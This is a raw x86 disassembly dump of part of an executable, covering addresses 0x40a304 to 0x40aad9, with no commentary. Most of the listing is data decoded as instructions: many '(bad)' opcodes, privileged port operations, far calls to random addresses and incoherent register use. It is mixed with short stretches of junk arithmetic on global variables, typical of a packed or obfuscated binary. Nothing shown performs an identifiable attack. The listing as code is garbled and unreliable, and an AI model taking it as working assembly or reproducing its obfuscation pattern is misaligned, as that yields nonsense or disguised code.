  40a304:	sub    esi,DWORD PTR [ebx-0x67]
  40a307:	cmp    bh,BYTE PTR [ebp-0x3ba219cb]
  40a30d:	(bad)  
  40a30e:	fld    TBYTE PTR [eax-0x31]
  40a311:	imul   ebx,DWORD PTR [ebx+0x2e8b49fa],0xffffffc6
  40a318:	ret    
  40a319:	push   0x388ef5fa
  40a31e:	jne    0x40a2de
  40a320:	mov    ds:0x864c659b,eax
  40a325:	aam    0x83
  40a327:	mov    ecx,0x557a60cc
  40a32c:	mov    ah,0x2c
  40a32e:	dec    esp
  40a32f:	jne    0x40a3a5
  40a331:	fwait
  40a332:	mov    eax,ds:0x5728c882
  40a337:	or     al,0x85
  40a339:	out    dx,eax
  40a33a:	mov    bh,0xac
  40a33c:	push   0xffffffe8
  40a33e:	(bad)  
  40a33f:	sub    eax,0x145ea28d
  40a344:	outs   dx,BYTE PTR ds:[esi]
  40a345:	int    0x98
  40a347:	mov    cs,WORD PTR [edx+0x2f86d4fb]
  40a34d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a34e:	mov    edi,DWORD PTR [ebx-0x4b1832fb]
  40a354:	inc    edx
  40a355:	adc    DWORD PTR [eax],ebp
  40a357:	xchg   ecx,eax
  40a358:	outs   dx,BYTE PTR ds:[esi]
  40a359:	and    BYTE PTR [eax+0x68],dl
  40a35c:	jl     0x40a2e9
  40a35e:	cmp    esi,eax
  40a360:	sar    DWORD PTR [ecx],0xb0
  40a363:	jo     0x40a33f
  40a365:	mov    dh,0x13
  40a367:	fwait
  40a368:	lock fs and al,0x91
  40a36c:	call   0xf6c3:0x4fa59252
  40a373:	push   0x67
  40a375:	or     eax,0x2b48b4bc
  40a37a:	inc    edx
  40a37b:	scas   al,BYTE PTR es:[edi]
  40a37c:	out    dx,eax
  40a37d:	sub    eax,edx
  40a37f:	rol    DWORD PTR ds:0x9d7d961f,1
  40a385:	sar    BYTE PTR [esi-0x77],0x40
  40a389:	push   ebp
  40a38a:	ss popa 
  40a38c:	push   cs
  40a38d:	or     BYTE PTR ds:0x8ebce433,al
  40a393:	cs sti 
  40a395:	push   eax
  40a396:	popf   
  40a397:	cmp    DWORD PTR [esi+0x7b6a8c6e],0x56
  40a39e:	push   esi
  40a39f:	push   ebp
  40a3a0:	or     al,0xd
  40a3a2:	inc    ebp
  40a3a3:	(bad)  
  40a3a4:	cwde   
  40a3a5:	mov    BYTE PTR [esp+esi*2],dh
  40a3a8:	aaa    
  40a3a9:	icebp  
  40a3aa:	push   es
  40a3ab:	sbb    dh,ch
  40a3ad:	jnp    0x40a413
  40a3af:	fucomi st,st(2)
  40a3b1:	mov    dl,0xd8
  40a3b3:	mov    cl,BYTE PTR [eax-0x373d8a54]
  40a3b9:	mov    al,ds:0x55f7fba6
  40a3be:	push   ds
  40a3bf:	jb     0x40a3ad
  40a3c1:	mov    al,ds:0x165861d2
  40a3c6:	dec    esp
  40a3c7:	in     al,dx
  40a3c8:	jge    0x40a3e5
  40a3ca:	mov    bh,0x2d
  40a3cc:	and    ah,BYTE PTR [esi+0x7def4aa5]
  40a3d2:	mov    ?,WORD PTR [eax-0x49]
  40a3d5:	fidiv  DWORD PTR ds:0x8bcdce70
  40a3db:	popf   
  40a3dc:	add    BYTE PTR [edi],0xc
  40a3df:	jbe    0x40a36f
  40a3e1:	mov    esi,DWORD PTR [eax+0x9ae2e49]
  40a3e7:	or     ebx,DWORD PTR [ecx-0x5694c88f]
  40a3ed:	pop    ss
  40a3ee:	dec    esp
  40a3ef:	ror    DWORD PTR [esi+edi*1+0x4f],0x7a
  40a3f4:	push   cs
  40a3f5:	sbb    al,0x62
  40a3f7:	lods   eax,DWORD PTR ds:[esi]
  40a3f8:	fcmovb st,st(6)
  40a3fa:	ja     0x40a40b
  40a3fc:	test   al,0x92
  40a3fe:	mov    ah,0xea
  40a400:	push   es
  40a401:	sbb    eax,0xc518f68
  40a406:	lods   eax,DWORD PTR ds:[esi]
  40a407:	or     ah,ah
  40a409:	push   ss
  40a40a:	xchg   esp,eax
  40a40b:	(bad)  
  40a40c:	sbb    ecx,DWORD PTR [ebx-0x2fcc03ab]
  40a412:	adc    DWORD PTR ds:0x433673,0x43369f
  40a41c:	add    edx,ecx
  40a41e:	mov    DWORD PTR ds:0x4336ab,0x68c0
  40a428:	cmp    edi,edx
  40a42a:	jb     0x40d767
  40a430:	mov    edx,DWORD PTR [ebp-0x28]
  40a433:	mov    edi,DWORD PTR [ebp-0x4]
  40a436:	xor    edx,eax
  40a438:	xor    ebx,ebx
  40a43a:	add    ebx,DWORD PTR ds:0x4335e3
  40a440:	and    DWORD PTR ds:0x4336df,ebx
  40a446:	xor    edi,eax
  40a448:	movzx  ebx,WORD PTR ds:0x4336d7
  40a44f:	sbb    DWORD PTR ds:0x4335e7,ebx
  40a455:	add    edi,ecx
  40a457:	add    DWORD PTR ds:0x433673,0x6da
  40a461:	add    edx,ecx
  40a463:	and    DWORD PTR ds:0x433627,0x0
  40a46d:	jmp    0x40a47f
  40a472:	mov    ebx,DWORD PTR ds:0x433627
  40a478:	inc    ebx
  40a479:	mov    DWORD PTR ds:0x433627,ebx
  40a47f:	cmp    DWORD PTR ds:0x433627,0x1c
  40a486:	jae    0x40a823
  40a48c:	cmp    DWORD PTR ds:0x433627,0x1e
  40a493:	jne    0x40a4a1
  40a499:	push   0x1
  40a49b:	call   DWORD PTR ds:0x412270
  40a4a1:	jmp    0x40a472
  40a4a6:	sbb    DWORD PTR ds:0x4336ef,0x1f9a
  40a4b0:	jmp    0x40a823
  40a4b5:	shl    BYTE PTR [edi-0x482074c],cl
  40a4bb:	bnd jno 0x40a491
  40a4be:	lahf   
  40a4bf:	inc    edi
  40a4c0:	sbb    edx,ebx
  40a4c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a4c3:	sub    ah,BYTE PTR [ecx+ecx*4-0x9]
  40a4c7:	jl     0x40a545
  40a4c9:	retf   0x7c79
  40a4cc:	jl     0x40a4f1
  40a4ce:	mov    ds,WORD PTR [ebx+ebx*2+0x1600f782]
  40a4d5:	and    edx,DWORD PTR [edi]
  40a4d7:	or     ah,BYTE PTR [ebx-0x4ff95355]
  40a4dd:	pop    esi
  40a4de:	lea    ebp,[ecx]
  40a4e0:	inc    edx
  40a4e1:	push   0xffffff80
  40a4e3:	inc    esp
  40a4e4:	sub    BYTE PTR [ecx],0x3a
  40a4e7:	and    eax,0xe116baf3
  40a4ec:	les    ebp,FWORD PTR [ecx+0x8aca995]
  40a4f2:	shl    DWORD PTR [ecx],1
  40a4f4:	xor    cl,BYTE PTR [eax]
  40a4f6:	xchg   ebp,eax
  40a4f7:	mov    esp,DWORD PTR [edi+0x4ee9f19]
  40a4fd:	arpl   WORD PTR cs:[eax+0x7dfa48e3],dx
  40a504:	or     DWORD PTR [edx],esi
  40a506:	test   esi,edi
  40a508:	and    ebx,DWORD PTR [edi]
  40a50a:	and    al,ah
  40a50c:	(bad)  
  40a50d:	fsub   DWORD PTR [esi]
  40a50f:	push   eax
  40a510:	inc    ecx
  40a511:	inc    esi
  40a512:	mov    cl,0x68
  40a514:	aad    0x4b
  40a516:	cmp    DWORD PTR [ebx+eax*1+0x5f8e6392],ecx
  40a51d:	push   ebp
  40a51e:	mov    eax,0x79ca3396
  40a523:	mov    al,0xb6
  40a525:	dec    ecx
  40a526:	pop    ebp
  40a527:	iret   
  40a528:	cmp    ecx,DWORD PTR ds:[edi+0x6]
  40a52c:	ds jecxz 0x40a4f1
  40a52f:	and    BYTE PTR [ebx],dl
  40a531:	mov    ch,0x63
  40a533:	pop    ecx
  40a534:	sbb    BYTE PTR [ecx-0x38e1e2bb],0x3e
  40a53b:	jmp    0x40a539
  40a53d:	push   ebx
  40a53e:	adc    al,0x2a
  40a540:	adc    eax,0x12fdda6e
  40a545:	sbb    al,0xf6
  40a547:	fsub   QWORD PTR [esi-0x436e6694]
  40a54d:	jmp    0x40a598
  40a54f:	shl    ecx,cl
  40a551:	(bad)  
  40a553:	mov    ah,0x20
  40a555:	addr16 xchg eax,edi
  40a558:	sub    bh,BYTE PTR [ecx]
  40a55a:	push   esp
  40a55b:	sbb    esi,0x2e
  40a55e:	jl     0x40a56a
  40a560:	mov    ecx,0x158da25b
  40a565:	jns    0x40a53d
  40a567:	sbb    eax,0xca481fb5
  40a56c:	add    al,0x9c
  40a56e:	inc    esp
  40a56f:	cmp    DWORD PTR [esi+0x68],edi
  40a572:	inc    ebp
  40a573:	in     al,0x3c
  40a575:	mov    al,0x9e
  40a577:	mov    dl,BYTE PTR ds:0xf2fc1237
  40a57d:	rol    ebp,1
  40a57f:	sbb    BYTE PTR [ebx-0x26],0x3
  40a583:	sbb    edx,DWORD PTR [esp+edx*8+0x43]
  40a587:	js     0x40a5bb
  40a589:	push   es
  40a58a:	loopne 0x40a5c2
  40a58c:	iret   
  40a58d:	ret    0xfda9
  40a590:	jg     0x40a5fb
  40a592:	dec    edi
  40a593:	enter  0x5311,0x15
  40a597:	push   cs
  40a598:	sar    BYTE PTR es:[edi+0x44],0x8d
  40a59d:	fistp  QWORD PTR ds:0xabf7d090
  40a5a3:	int    0x6f
  40a5a5:	push   ecx
  40a5a6:	mov    al,ds:0x341b807f
  40a5ab:	sar    BYTE PTR [esi+0x2f],1
  40a5ae:	ins    DWORD PTR es:[edi],dx
  40a5af:	pop    edi
  40a5b0:	(bad)  [ebx]
  40a5b2:	popf   
  40a5b3:	mov    ch,0xd1
  40a5b5:	sub    ebx,DWORD PTR [eax+0x157d9334]
  40a5bb:	cld    
  40a5bc:	test   al,0xb8
  40a5be:	shl    DWORD PTR es:[esi],1
  40a5c1:	push   0xffffffc6
  40a5c3:	adc    ebp,DWORD PTR [ebp-0xf051bb3]
  40a5c9:	xor    al,0xe2
  40a5cb:	push   ecx
  40a5cc:	jecxz  0x40a610
  40a5ce:	cmp    DWORD PTR [ebp-0x5616ce1b],esi
  40a5d4:	add    al,0xa1
  40a5d6:	addr16 adc al,0x52
  40a5d9:	xchg   DWORD PTR [esi],ecx
  40a5db:	aaa    
  40a5dc:	xor    DWORD PTR [eax+0x2c],eax
  40a5df:	pop    esi
  40a5e0:	gs jle 0x40a5c9
  40a5e3:	retf   0x44a1
  40a5e6:	adc    BYTE PTR [esp+ebp*4-0x53],bh
  40a5ea:	sub    BYTE PTR [ecx+0x7d2d111d],dl
  40a5f0:	or     BYTE PTR [ebx-0x4d],ah
  40a5f3:	mov    ch,0xa9
  40a5f5:	lahf   
  40a5f6:	gs ret 
  40a5f8:	sub    DWORD PTR [eax],esi
  40a5fa:	jne    0x40a647
  40a5fc:	fiadd  DWORD PTR [ecx]
  40a5fe:	cmp    cl,dl
  40a600:	cmp    BYTE PTR [edx+eiz*2-0x7c],bl
  40a604:	xor    DWORD PTR [eax-0x20bf3c06],eax
  40a60a:	or     esi,ecx
  40a60c:	ss dec ecx
  40a60e:	jae    0x40a665
  40a610:	cmp    dl,0xc0
  40a613:	fwait
  40a614:	rcl    esi,cl
  40a616:	aas    
  40a617:	les    ecx,FWORD PTR [edx+0x3e]
  40a61a:	xchg   ecx,eax
  40a61b:	icebp  
  40a61c:	daa    
  40a61d:	jle    0x40a5e8
  40a61f:	enter  0x1c6c,0xb9
  40a623:	shl    BYTE PTR [ecx],1
  40a625:	sbb    eax,0xc6ffb712
  40a62a:	and    eax,DWORD PTR [eax-0x3e5e346f]
  40a630:	out    0x14,al
  40a632:	jo     0x40a65b
  40a634:	jne    0x40a684
  40a636:	repnz fldenv [esi+0x5d1b06a2]
  40a63d:	bts    edx,esp
  40a640:	and    ah,BYTE PTR [ecx]
  40a642:	aaa    
  40a643:	push   ebp
  40a644:	mov    bl,0xe2
  40a646:	daa    
  40a647:	push   ebx
  40a648:	adc    dh,bl
  40a64a:	cdq    
  40a64b:	xor    al,0xf9
  40a64d:	add    al,0xc6
  40a64f:	push   ecx
  40a650:	xor    bl,al
  40a652:	ins    BYTE PTR es:[edi],dx
  40a653:	add    esp,ecx
  40a655:	jbe    0x40a6cf
  40a657:	(bad)  
  40a658:	jb     0x40a60b
  40a65a:	in     eax,dx
  40a65b:	pop    edi
  40a65c:	stc    
  40a65d:	pop    edx
  40a65e:	nop
  40a65f:	js     0x40a60d
  40a661:	adc    DWORD PTR [esi+edx*2-0x27],ecx
  40a665:	cs cld 
  40a667:	test   al,0x3b
  40a669:	lea    ecx,[eax+0x21]
  40a66c:	xchg   BYTE PTR [edi-0x51],bh
  40a66f:	mov    dl,0xc7
  40a671:	jp     0x40a686
  40a673:	mov    edx,0xa2a107c8
  40a678:	jp     0x40a6e3
  40a67a:	sub    esp,DWORD PTR fs:[edi+0x1d629245]
  40a681:	icebp  
  40a682:	adc    BYTE PTR [ebx+ebx*2],cl
  40a685:	call   0x138470b3
  40a68a:	push   edi
  40a68b:	jg     0x40a611
  40a68d:	cli    
  40a68e:	(bad)  
  40a68f:	dec    ebx
  40a690:	xchg   ebx,eax
  40a691:	cld    
  40a692:	add    DWORD PTR [ebx+0x2d],esi
  40a695:	sub    edi,DWORD PTR [esi+0x3e]
  40a698:	adc    ch,BYTE PTR [ebx-0x5e]
  40a69b:	push   edi
  40a69c:	ret    0xe35
  40a69f:	mov    ebx,0xad8079fc
  40a6a4:	cmp    DWORD PTR [eax+0x5e5a33e0],edi
  40a6aa:	jb     0x40a649
  40a6ac:	std    
  40a6ad:	adc    al,0x3b
  40a6af:	(bad)  
  40a6b0:	aas    
  40a6b1:	repnz test DWORD PTR [edi+ebx*4],0x5ba751d3
  40a6b9:	mov    WORD PTR [ecx],fs
  40a6bb:	xchg   ecx,eax
  40a6bc:	and    ch,dh
  40a6be:	jg     0x40a6b3
  40a6c0:	popf   
  40a6c1:	or     ebx,DWORD PTR [eax+edx*8-0x52]
  40a6c5:	mov    ebx,0x61febe78
  40a6ca:	fs jmp 0x76f596a8
  40a6d0:	push   es
  40a6d1:	ficom  WORD PTR [edi-0x43e28166]
  40a6d7:	mov    ds:0x93e36346,eax
  40a6dc:	popa   
  40a6dd:	xchg   DWORD PTR [esi],edx
  40a6df:	lock sar BYTE PTR [ecx+0x36],0x4d
  40a6e4:	xchg   esp,ebp
  40a6e6:	loopne 0x40a6a6
  40a6e8:	out    dx,eax
  40a6e9:	mov    esp,0xd80b1aee
  40a6ee:	bound  esi,QWORD PTR [edi-0x74]
  40a6f1:	nop
  40a6f2:	(bad)  
  40a6f3:	mov    eax,ds:0xac79b0e3
  40a6f8:	push   edi
  40a6f9:	pop    ebx
  40a6fa:	mov    bh,ah
  40a6fc:	popa   
  40a6fd:	arpl   WORD PTR ds:0x14f55a65,di
  40a703:	push   eax
  40a704:	jnp    0x40a68e
  40a706:	arpl   WORD PTR [edx+0x62],sp
  40a709:	test   dh,dh
  40a70b:	xor    ch,0xc3
  40a70e:	dec    edx
  40a70f:	fcmovb st,st(3)
  40a711:	aam    0x6d
  40a713:	or     DWORD PTR [edi-0xf71e6d9],0xb
  40a71a:	stos   BYTE PTR es:[edi],al
  40a71b:	mov    esp,0x27bb7401
  40a720:	(bad)  
  40a721:	lahf   
  40a722:	mov    eax,ds:0xc893de7a
  40a727:	push   edi
  40a728:	(bad)  
  40a729:	mul    DWORD PTR [ecx+ebp*4+0x17]
  40a72d:	and    ebx,DWORD PTR [ebp+0x70]
  40a730:	clc    
  40a731:	gs icebp 
  40a733:	inc    ecx
  40a734:	(bad)  
  40a737:	ror    BYTE PTR [edx+0x2],cl
  40a73a:	div    DWORD PTR [ecx+0x3a]
  40a73d:	or     ebp,ebx
  40a73f:	mov    eax,0x7a6b6e2
  40a744:	jle    0x40a74b
  40a746:	int    0x69
  40a748:	pop    ss
  40a749:	push   cs
  40a74a:	not    cl
  40a74c:	outs   dx,BYTE PTR ds:[esi]
  40a74d:	ja     0x40a7ab
  40a74f:	call   0x9bf:0xce4df133
  40a756:	xor    al,0x88
  40a758:	inc    ecx
  40a759:	adc    eax,0x45948a3b
  40a75e:	mov    edi,0x9ab0b054
  40a763:	jmp    0x40a729
  40a765:	call   0x3859ee4c
  40a76a:	push   eax
  40a76b:	dec    esi
  40a76c:	push   edx
  40a76d:	pop    ebp
  40a76e:	into   
  40a76f:	sar    ah,cl
  40a771:	retf   0xf45e
  40a774:	adc    al,0xe2
  40a776:	push   esp
  40a777:	pop    edx
  40a778:	cmp    ah,dh
  40a77a:	out    0xbc,al
  40a77c:	jle    0x40a747
  40a77e:	push   edx
  40a77f:	adc    esp,ebp
  40a781:	repnz mov ecx,DWORD PTR [ecx-0x30]
  40a785:	add    bl,al
  40a787:	adc    edi,DWORD PTR [edi+0xf]
  40a78a:	pop    esp
  40a78b:	dec    edx
  40a78c:	(bad)  
  40a78d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a78e:	pop    ss
  40a78f:	xchg   esp,eax
  40a790:	xor    al,0xdb
  40a792:	iret   
  40a793:	loopne 0x40a796
  40a795:	mov    ebx,0x3e273a46
  40a79a:	shl    DWORD PTR [edx-0x5c],1
  40a79d:	or     eax,0xcd1a1118
  40a7a2:	push   cs
  40a7a3:	mov    eax,ds:0x6fa82a8b
  40a7a8:	aam    0x8a
  40a7aa:	push   ds
  40a7ab:	stc    
  40a7ac:	sbb    BYTE PTR [edx],cl
  40a7ae:	pop    eax
  40a7af:	inc    eax
  40a7b0:	mov    al,ds:0xbb24b469
  40a7b5:	jg     0x40a808
  40a7b7:	pop    ss
  40a7b8:	sub    al,0x55
  40a7ba:	jne    0x40a806
  40a7bc:	sti    
  40a7bd:	js     0x40a77f
  40a7bf:	add    DWORD PTR [ecx+0x25],0x6698f10c
  40a7c6:	or     esp,DWORD PTR [ebx+eax*4-0x66]
  40a7ca:	pop    ecx
  40a7cb:	jecxz  0x40a79a
  40a7cd:	pop    es
  40a7ce:	cwde   
  40a7cf:	adc    BYTE PTR [esi-0x5bb707a5],ah
  40a7d5:	test   BYTE PTR [esi-0x63],al
  40a7d8:	into   
  40a7d9:	xor    al,0xa5
  40a7db:	cmp    ecx,esi
  40a7dd:	jno    0x40a836
  40a7df:	clc    
  40a7e0:	mov    al,ds:0x983f8db
  40a7e5:	ds and eax,0x1c542588
  40a7eb:	mov    esi,0xd2d71be
  40a7f0:	(bad)  
  40a7f1:	(bad)  
  40a7f2:	out    0x2f,al
  40a7f4:	jl     0x40a806
  40a7f6:	fidiv  DWORD PTR [esi]
  40a7f8:	pop    edi
  40a7f9:	shr    BYTE PTR [esi],cl
  40a7fb:	or     dl,BYTE PTR [ebx]
  40a7fd:	repnz inc edx
  40a7ff:	mov    edx,DWORD PTR [ecx]
  40a801:	and    esp,DWORD PTR [edx+edi*8+0x1de0f3af]
  40a808:	mov    dh,0x6c
  40a80a:	imul   eax,DWORD PTR [ebp-0x3c],0xffffff9c
  40a80e:	out    0x77,al
  40a810:	das    
  40a811:	push   es
  40a812:	inc    ecx
  40a813:	es xchg dl,dl
  40a816:	sbb    al,BYTE PTR [esi-0x7e]
  40a819:	jb     0x40a7a2
  40a81b:	in     eax,0x7
  40a81d:	ins    DWORD PTR es:[edi],dx
  40a81e:	or     al,0xea
  40a820:	or     eax,ebp
  40a822:	add    al,0xf
  40a824:	scas   eax,DWORD PTR es:[edi]
  40a825:	xlat   BYTE PTR ds:[ebx]
  40a826:	adc    DWORD PTR ds:0x43362f,ebx
  40a82c:	mov    edi,DWORD PTR [ebp-0x8]
  40a82f:	or     DWORD PTR ds:0x43362b,ecx
  40a835:	mov    ebx,DWORD PTR [ebp-0x10]
  40a838:	sub    ebx,edi
  40a83a:	cmp    ebx,edx
  40a83c:	mov    DWORD PTR ds:0x43366f,0x652d
  40a846:	ja     0x40a872
  40a84c:	xor    edx,DWORD PTR ds:0x433617
  40a852:	mov    edx,DWORD PTR [ebp-0x4]
  40a855:	sbb    DWORD PTR ds:0x43365f,0x855
  40a85f:	xor    edx,eax
  40a861:	add    edx,ecx
  40a863:	mov    DWORD PTR ds:0x43362f,0x65c5
  40a86d:	jmp    0x40bab5
  40a872:	mov    ebx,DWORD PTR ds:0x4336a3
  40a878:	sub    ebx,DWORD PTR ds:0x4335cf
  40a87e:	mov    DWORD PTR ds:0x4336a3,ebx
  40a884:	mov    edx,DWORD PTR [ebp-0x2c]
  40a887:	mov    edi,DWORD PTR [ebp-0x4]
  40a88a:	or     DWORD PTR ds:0x433617,ebx
  40a890:	xor    edx,eax
  40a892:	xor    edi,eax
  40a894:	movzx  ebx,BYTE PTR ds:0x433697
  40a89b:	adc    DWORD PTR ds:0x4335d3,ebx
  40a8a1:	add    edi,ecx
  40a8a3:	add    edx,ecx
  40a8a5:	imul   edx,edi
  40a8a8:	adc    DWORD PTR ds:0x433627,edi
  40a8ae:	mov    edi,DWORD PTR [ebp-0x8]
  40a8b1:	mov    ebx,DWORD PTR [ebp-0x10]
  40a8b4:	sub    ebx,edi
  40a8b6:	cmp    ebx,edx
  40a8b8:	ja     0x40a8c6
  40a8be:	mov    edx,DWORD PTR [ebp-0x28]
  40a8c1:	jmp    0x40baa7
  40a8c6:	mov    edx,DWORD PTR [ebp-0x30]
  40a8c9:	mov    edi,DWORD PTR [ebp-0x4]
  40a8cc:	xor    edx,eax
  40a8ce:	xor    edi,eax
  40a8d0:	jmp    0x40ac43
  40a8d5:	call   0x73960c99
  40a8da:	jge    0x40a8ce
  40a8dc:	pop    ecx
  40a8dd:	jno    0x40a8ff
  40a8df:	aad    0xd1
  40a8e1:	dec    esp
  40a8e2:	add    esi,DWORD PTR ds:0x7cf06719
  40a8e8:	jl     0x40a8b4
  40a8ea:	jns    0x40a968
  40a8ec:	jl     0x40a8fd
  40a8ee:	in     eax,0x9a
  40a8f0:	fcomp  st(3)
  40a8f2:	xor    BYTE PTR [eax-0x57],bh
  40a8f5:	mov    al,ds:0x90ec3437
  40a8fa:	movsx  eax,WORD PTR [ebx-0x6338bdc2]
  40a901:	loope  0x40a8ed
  40a903:	clc    
  40a904:	je     0x40a890
  40a906:	jecxz  0x40a953
  40a908:	xchg   al,bl
  40a90a:	inc    ebx
  40a90b:	push   0x4b7a8d6f
  40a910:	int    0x24
  40a912:	and    BYTE PTR [edx+0x714050cb],dh
  40a918:	nop
  40a919:	and    al,0xe4
  40a91b:	adc    edi,DWORD PTR [edx+0x1300099a]
  40a921:	xor    BYTE PTR [edx],0x48
  40a924:	sub    ch,BYTE PTR [ecx+0xe]
  40a927:	lds    ecx,FWORD PTR [edi]
  40a929:	ins    BYTE PTR es:[edi],dx
  40a92a:	adc    eax,0x931f941b
  40a92f:	popa   
  40a930:	cmp    ebx,DWORD PTR [esi+0x76fbeb87]
  40a936:	pop    esp
  40a937:	ss pop esi
  40a939:	push   0x29feb44e
  40a93e:	push   eax
  40a93f:	mov    eax,0x5fcdceb
  40a944:	int3   
  40a945:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a946:	jl     0x40a9aa
  40a948:	fdiv   DWORD PTR [esp+ebp*4-0x3018ea6]
  40a94f:	not    BYTE PTR [esp+eax*1-0x1ca5c268]
  40a956:	sbb    BYTE PTR [edx-0x61],0xae
  40a95a:	mov    ds:0xcfb97c17,eax
  40a95f:	or     DWORD PTR [esi+0x72],esi
  40a962:	int3   
  40a963:	in     eax,dx
  40a964:	mov    dl,0x57
  40a966:	jbe    0x40a9cf
  40a968:	pusha  
  40a969:	and    eax,0xb1f4ddd5
  40a96e:	or     eax,0x9323caf3
  40a974:	retf   
  40a975:	inc    esp
  40a976:	into   
  40a977:	sub    edx,DWORD PTR [edi]
  40a979:	je     0x40a978
  40a97b:	ror    esi,0x30
  40a97e:	imul   edx,esi,0x39
  40a981:	sbb    al,0xd8
  40a984:	push   esp
  40a985:	pop    ecx
  40a986:	mov    eax,0x515b775e
  40a98b:	mov    dl,0xa1
  40a98d:	das    
  40a98e:	shl    DWORD PTR [esi],0xfd
  40a991:	mov    DWORD PTR [edi-0x46],0x9c48c546
  40a998:	mov    bh,0x3a
  40a99a:	sub    eax,0x2b1956a1
  40a99f:	jne    0x40aa03
  40a9a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9a2:	lods   al,BYTE PTR ds:[esi]
  40a9a3:	push   es
  40a9a4:	aas    
  40a9a5:	das    
  40a9a6:	clc    
  40a9a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a9a8:	cmp    al,0x79
  40a9aa:	sbb    DWORD PTR [edi*8-0x51f66681],esp
  40a9b1:	and    eax,0x93393753
  40a9b6:	scas   al,BYTE PTR es:[edi]
  40a9b7:	lods   eax,DWORD PTR ds:[esi]
  40a9b8:	dec    esi
  40a9b9:	xchg   esi,eax
  40a9ba:	repz xor al,0xb0
  40a9bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9be:	fwait
  40a9bf:	sbb    DWORD PTR [edx+eiz*4-0x49],ebp
  40a9c3:	leave  
  40a9c4:	retf   
  40a9c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9c6:	sub    eax,edi
  40a9c8:	fldcw  WORD PTR [ebp-0x5a]
  40a9cb:	inc    ecx
  40a9cc:	out    0xfa,eax
  40a9ce:	rol    ebp,0xea
  40a9d1:	mov    ebp,0xf9f96402
  40a9d6:	add    BYTE PTR [esi+0x25],dl
  40a9d9:	cmp    DWORD PTR [ebx],ecx
  40a9db:	pop    ds
  40a9dc:	push   es
  40a9dd:	aaa    
  40a9de:	les    eax,FWORD PTR [edi+eiz*4+0x36f3e3a4]
  40a9e5:	pop    edx
  40a9e6:	std    
  40a9e7:	cmp    DWORD PTR [esi],edi
  40a9e9:	test   bl,cl
  40a9eb:	addr16 mov dl,0x89
  40a9ee:	pop    eax
  40a9ef:	xchg   edi,eax
  40a9f0:	lods   al,BYTE PTR ds:[esi]
  40a9f1:	jmp    0x276f1000
  40a9f6:	fucomp st(5)
  40a9f8:	stos   BYTE PTR es:[edi],al
  40a9f9:	sahf   
  40a9fa:	pop    esi
  40a9fb:	xchg   ebp,eax
  40a9fc:	mov    bh,0x19
  40a9fe:	xor    bh,BYTE PTR [ecx+edx*1-0x56ba1485]
  40aa05:	mul    edx
  40aa07:	outs   dx,BYTE PTR ds:[esi]
  40aa08:	mov    eax,0xa356112a
  40aa0d:	mov    bl,0xf7
  40aa0f:	cwde   
  40aa10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa11:	adc    ebx,esi
  40aa13:	inc    esp
  40aa14:	cmc    
  40aa15:	cmc    
  40aa16:	xchg   DWORD PTR [esi-0x2f],ebx
  40aa19:	or     DWORD PTR [ebx+0xa],ebp
  40aa1c:	loop   0x40aa5b
  40aa1e:	mov    ch,0x10
  40aa20:	mov    ecx,ds
  40aa22:	xchg   DWORD PTR [eax-0x17],ebx
  40aa25:	or     DWORD PTR [edx],esi
  40aa27:	dec    edi
  40aa28:	hlt    
  40aa29:	add    dl,BYTE PTR [ebx+eiz*8]
  40aa2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa2d:	pop    esp
  40aa2e:	leave  
  40aa2f:	je     0x40aa99
  40aa31:	ret    0x5769
  40aa34:	pop    eax
  40aa35:	imul   ebp,DWORD PTR [edx-0x20b339a],0xffffff94
  40aa3c:	jae    0x40aa14
  40aa3e:	out    0x45,al
  40aa40:	rcl    bh,1
  40aa42:	inc    ecx
  40aa43:	xlat   BYTE PTR ds:[ebx]
  40aa44:	dec    esp
  40aa45:	xor    bh,BYTE PTR [ecx+edx*1]
  40aa48:	imul   edi,DWORD PTR [edi+0x57],0x9753b8ef
  40aa4f:	jecxz  0x40aa70
  40aa51:	daa    
  40aa52:	xchg   edi,edi
  40aa54:	push   eax
  40aa55:	inc    edi
  40aa56:	add    eax,0xf1c68112
  40aa5b:	cs mov bl,ch
  40aa5e:	iret   
  40aa5f:	and    ebx,DWORD PTR [edi+0x27b369f5]
  40aa65:	or     BYTE PTR [eax],dh
  40aa67:	sub    BYTE PTR [edi+0x6],0xdb
  40aa6b:	bound  edx,QWORD PTR [edi+edi*1]
  40aa6e:	aad    0xee
  40aa70:	jnp    0x40aa3e
  40aa72:	scas   eax,DWORD PTR es:[edi]
  40aa73:	mov    ch,0x92
  40aa75:	adc    eax,0x450e6796
  40aa7a:	or     BYTE PTR [edx],ah
  40aa7c:	push   ecx
  40aa7d:	arpl   bp,bp
  40aa7f:	imul   ebp,DWORD PTR [edi-0x2e],0xffffff8e
  40aa83:	jmp    0xaf6796ab
  40aa88:	test   eax,0x3987e0e4
  40aa8d:	mov    ch,0x9d
  40aa8f:	add    esi,ebx
  40aa91:	push   edi
  40aa92:	test   BYTE PTR [ecx],bl
  40aa94:	mov    cl,0xf
  40aa96:	and    edx,DWORD PTR [eax+0x46]
  40aa99:	out    0xe5,eax
  40aa9b:	jge    0x40aa56
  40aa9d:	jnp    0x40aa63
  40aa9f:	loopne 0x40ab06
  40aaa1:	fcomi  st,st(7)
  40aaa3:	call   0x7473:0x78cdc9b1
  40aaaa:	mov    dl,BYTE PTR [ecx-0x41]
  40aaad:	adc    eax,0x7094085b
  40aab2:	or     ah,0xa5
  40aab5:	adc    bh,al
  40aab7:	adc    BYTE PTR [edi-0x1d4e217a],bl
  40aabd:	mov    ah,0x84
  40aabf:	inc    edi
  40aac0:	scas   al,BYTE PTR es:[edi]
  40aac1:	(bad)  
  40aac2:	dec    esp
  40aac3:	pop    ebp
  40aac4:	pusha  
  40aac5:	sbb    eax,0x8cbd2e8a
  40aaca:	mov    al,ds:0x112ba212
  40aacf:	scas   al,BYTE PTR es:[edi]
  40aad0:	jle    0x40aab9
  40aad2:	out    dx,al
  40aad3:	lds    ecx,FWORD PTR [ebx+0x26]
  40aad6:	inc    ecx
  40aad7:	sbb    al,0xd
  40aad9:	adc    al,0xd
